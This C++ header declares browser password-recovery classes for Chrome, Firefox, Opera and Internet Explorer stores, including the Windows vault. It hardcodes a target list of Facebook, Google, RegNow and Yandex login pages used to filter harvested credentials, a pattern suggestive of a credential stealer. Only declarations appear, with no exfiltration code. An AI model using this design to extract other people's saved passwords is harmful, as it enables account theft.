#ifndef _PASSWORD_RECOVERY_H_
#define _PASSWORD_RECOVERY_H_

#pragma once
//////////////////////////////////////////////////////////////////////////
#include "PasswordRecords.h"
#include "PasswordDecryptor.h"
#include "InternetExplorerSecret.h"
#include "InternetExplorerVault.h"

class IPasswordRecoveryCallback
{
public:
	virtual void OnRecoveryStart() = 0;
	virtual void OnRecoveryRecord(LPCTSTR lpszSiteAddress, LPCTSTR lpszLogin, LPCTSTR lpszPassword, LONG nDateCreated) = 0;
	virtual void OnRecoveryComplete() = 0;
	virtual void OnRecoveryWarning(LPCTSTR lpszMessage) = 0;
	virtual void OnRecoveryError(LPCTSTR lpszMessage) = 0;
};

class IPasswordRecovery
{
public:
	virtual void DoRecovery(IPasswordRecoveryCallback* pCallback) = 0;
};

class CPasswordRecovery
	: public IPasswordRecovery
{
public:
	CPasswordRecovery()
	{
		m_cMatchSites.AddTail(TEXT("http://www.facebook.com"));
		m_cMatchSites.AddTail(TEXT("https://www.facebook.com"));
		m_cMatchSites.AddTail(TEXT("http://login.facebook.com"));
		m_cMatchSites.AddTail(TEXT("https://login.facebook.com"));
		m_cMatchSites.AddTail(TEXT("http://www.facebook.com/login.php"));
		m_cMatchSites.AddTail(TEXT("http://www.facebook.com/index.php"));
		m_cMatchSites.AddTail(TEXT("https://www.google.com/accounts/servicelogin"));
		m_cMatchSites.AddTail(TEXT("https://www.regnow.com/vendorpriv"));
		m_cMatchSites.AddTail(TEXT("https://www.regnow.com/affiliatepriv"));
		m_cMatchSites.AddTail(TEXT("http://www.yandex.ru"));
	}
	virtual ~CPasswordRecovery()
	{
		m_cMatchSites.RemoveAll();
	}
protected:
	void RemoveLastPathSymbol(CString& strSiteAddress)
	{
		if(strSiteAddress.Right(1) == TEXT("/"))
		{
			strSiteAddress.Delete(strSiteAddress.GetLength() - 1, 1);
		}
	}

	BOOL MatchSiteAddress(const CString& strSiteAddress)
	{
		CString strLowerSite(strSiteAddress);
		strLowerSite.MakeLower();
		
		POSITION pos = m_cMatchSites.Find(strLowerSite);
		if(pos != NULL)
			return TRUE;

		for(pos = m_cMatchSites.GetHeadPosition(); pos != NULL;)
		{  
			CString strItemSite = m_cMatchSites.GetNext(pos);
			if(strItemSite.IsEmpty())
				continue;

			if(lstrcmp(strItemSite, strLowerSite) == 0)
				return TRUE;

			if(strLowerSite.Find(strItemSite) > 0)
				return TRUE;

			if(strLowerSite.Find(strItemSite) > 0)
				return TRUE;
		}

		return FALSE;
	}
protected:
	CStringList m_cMatchSites;
};

class CChromePasswordRecovery
	: public CPasswordRecovery
{
protected:
	virtual void DoRecovery(IPasswordRecoveryCallback* pCallback);
private:
	BOOL IsChromeRunning();
	void ProcessData(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
private:
	CChromePasswordDecryptor m_cPasswordDecryptor;
};

class CFirefoxPasswordRecovery
	: public CPasswordRecovery
{
protected:
	virtual void DoRecovery(IPasswordRecoveryCallback* pCallback);
private:
	BOOL GetInstallPath(IPasswordRecoveryCallback* pCallback, HKEY hRootKey, CString& strPath);
	BOOL GetProfilePath(IPasswordRecoveryCallback* pCallback, CString& strPath);
	BOOL SetEnvironmentPath(IPasswordRecoveryCallback* pCallback, LPCTSTR strPath);
	void ProcessVersionLess2_0(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
	void ProcessVersion2_0Between3_0(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
	void ProcessVersion3_0Between3_5(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
	void ProcessVersion3_5Between32_0(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
	void ProcessVersionAbove32_0(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
private:
	CFirefoxPasswordDecryptor m_cPasswordDecryptor;
};

class COperaPasswordRecovery
	: public CPasswordRecovery
{
protected:
	virtual void DoRecovery(IPasswordRecoveryCallback* pCallback);
private:
	void ProcessProfileAccountData(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
	void ProcessWandData(IPasswordRecoveryCallback* pCallback, LPCTSTR lpszPath);
private:
	COperaPasswordDecryptor m_cPasswordDecryptor;
};

class CInternetExplorerPasswordRecovery
	: public CPasswordRecovery
{
public:
	CInternetExplorerPasswordRecovery();
	virtual ~CInternetExplorerPasswordRecovery();
protected:
	virtual void DoRecovery(IPasswordRecoveryCallback* pCallback);
private:
	DWORD GetWindowsVersion(PDWORD pdwMajorVersion, PDWORD pdwMinorVersion, PDWORD pdwBuild);
	BOOL GetBrowserVersion(CString& strBuild, CString& strVersion);
	BOOL InitVaultCli();
	BOOL CleanVaultCli();
	BOOL InitHashSiteMap();
	BOOL HasHash(const CString& strHash);
	BOOL GetSite(const CString& strHash, CString& strSite);
	void ProcessUrlCacheData(IPasswordRecoveryCallback* pCallback);
	void ProcessAutoCompleteData(IPasswordRecoveryCallback* pCallback);
	void ProcessVault7Data(IPasswordRecoveryCallback* pCallback);
	void ProcessVault8Data(IPasswordRecoveryCallback* pCallback);
	void ProcessIPStoreData(IPasswordRecoveryCallback* pCallback);
	void ProcessHttpAuthData(IPasswordRecoveryCallback* pCallback);
	BOOL GetRegistryTypedURLs(CStringArray& cUrlArray);
	BOOL GetHistoryURLs(CStringArray& cUrlArray);
	BOOL GetCacheHtmlInfo(const CString& strFilePath, CString& strLogin, CString& strPassword);
private:
	HMODULE m_hVaultCli;
	PfnVaultEnumerateVaults m_pfnVaultEnumerateVaults;
	PfnVaultOpenVault m_pfnVaultOpenVault;
	PfnVaultFree m_pfnVaultFree;
	PfnVaultCloseVault m_pfnVaultCloseVault;
	PfnVaultGetInformation m_pfnVaultGetInformation;
	PfnVaultEnumerateItems m_pfnVaultEnumerateItems;
	PfnVaultEnumerateItemTypes m_pfnVaultEnumerateItemTypes;
	PfnVaultGetItem7 m_pfnVaultGetItem7;
	PfnVaultGetItem8 m_pfnVaultGetItem8;

	CMapStringToString m_cMapHashSites;

	CInternetExplorerPasswordDecryptor m_cPasswordDecryptor;
};

#endif // _PASSWORD_RECOVERY_H_